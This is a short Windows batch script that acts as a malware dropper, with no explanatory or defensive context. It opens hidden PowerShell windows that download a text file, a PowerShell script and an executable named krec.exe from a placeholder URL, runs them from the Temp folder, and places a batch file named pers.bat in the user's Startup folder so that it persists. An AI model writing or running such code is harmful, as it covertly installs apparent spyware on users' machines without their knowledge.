@ECHO OFF
cd %userprofile%\AppData\Local\Temp
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('url/Record2.txt','Record2.txt');(New-Object System.Net.WebClient).DownloadFile('url/smkscr.ps1','smkscr.ps1');(New-Object System.Net.WebClient).DownloadFile('url/krec.exe','krec.exe');Start-Process 'krec.exe';.\smkscr.ps1; 
cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('url/pers.bat', 'pers.bat')

